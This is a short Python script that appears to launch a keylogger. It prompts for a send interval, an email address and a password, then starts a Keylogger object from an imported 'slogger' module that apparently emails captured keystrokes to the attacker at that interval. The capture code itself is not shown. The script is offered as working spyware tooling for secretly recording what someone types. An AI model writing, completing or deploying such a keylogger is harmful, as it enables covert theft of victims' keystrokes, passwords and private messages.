import slogger, getpass, os



try:

    interval = int(input("Enter the Time Interval after you want to recieve mails ( in secs ): "))

    email = input("Enter the valid Email on which you want to recieve mails: ")

    password = getpass.getpass("Enter Password: ", stream=None)

    os.system("cls")

except Exception:

    print("Wrong Input... PLease try Again !")

else:		

    my_kelogger = slogger.Keylogger(interval, email, password)

    my_kelogger.start()
    print("press Any Key to exit...")
    input()
    